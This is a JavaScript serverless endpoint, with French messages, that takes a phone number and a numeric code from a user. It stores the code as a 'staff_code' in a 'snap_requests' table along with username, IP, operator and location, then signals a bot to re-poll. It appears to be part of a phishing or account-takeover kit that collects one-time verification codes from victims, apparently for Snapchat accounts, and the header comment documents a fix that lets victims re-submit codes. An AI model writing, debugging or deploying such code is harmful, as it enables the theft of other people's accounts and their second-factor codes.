/**
 * api/verify-code.js — User code submission endpoint
 *
 * BUG 6 FIX: retry_code status was not handled.
 *   Old: only checked `completed` → users stuck in retry_code couldn't re-submit.
 *   New: accepts submissions when status is 'waiting_code' OR 'retry_code'.
 *        Rejects if completed, wrong_number, or any other terminal status.
 */

import { neon } from "@neondatabase/serverless";
import { checkBannedIP } from "./middleware.js";

const ALLOWED_STATUSES = new Set(["waiting_code", "retry_code"]);
const TERMINAL_STATUSES = new Set(["completed", "wrong_number"]);

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    if (req.method === "OPTIONS") { res.status(200).end(); return; }
    if (req.method !== "POST") return res.status(405).json({ success: false });

    try {
        const blocked = await checkBannedIP(req, res);
        if (blocked) return blocked;

        const { phone, code } = req.body;
        if (!phone || !code) {
            return res.status(400).json({ success: false, message: "Champs manquants" });
        }

        const sql = neon(process.env.DATABASE_URL);
        const result = await sql`
            SELECT id, username, phone, ip_address, code_length, status, operator, country, city
            FROM snap_requests WHERE phone = ${phone} LIMIT 1
        `;

        if (result.length === 0) {
            return res.status(404).json({ success: false, message: "Demande non trouvée" });
        }

        const row = result[0];

        // Already completed — idempotent success
        if (row.status === "completed") {
            return res.status(200).json({ success: true, message: "Déjà validé" });
        }

        // Terminal state: user shouldn't be able to submit
        if (TERMINAL_STATUSES.has(row.status) && row.status !== "completed") {
            return res.status(409).json({
                success: false,
                message: "Cette demande ne peut plus être modifiée.",
            });
        }

        // BUG 6 FIX: accept both waiting_code and retry_code
        if (!ALLOWED_STATUSES.has(row.status)) {
            return res.status(409).json({
                success: false,
                message: "Votre demande est en cours de traitement, veuillez patienter.",
            });
        }

        // Validate the code format
        const expectedLen = row.code_length || 6;
        const codeStr = String(code).replace(/\s/g, "");
        if (codeStr.length !== expectedLen || !/^\d+$/.test(codeStr)) {
            return res.status(400).json({
                success: false,
                message: `Code invalide (${expectedLen} chiffres requis)`,
            });
        }

        // Update: status → code_submitted (triggers updated_at via DB trigger → bot re-polls)
        await sql`
            UPDATE snap_requests
            SET status = 'code_submitted', staff_code = ${codeStr}
            WHERE phone = ${phone}
        `;

        return res.status(200).json({
            success: true,
            message: "Code soumis, en attente de vérification",
        });
    } catch (e) {
        console.error("verify-code error:", e);
        return res.status(500).json({ success: false, message: e.message });
    }
}
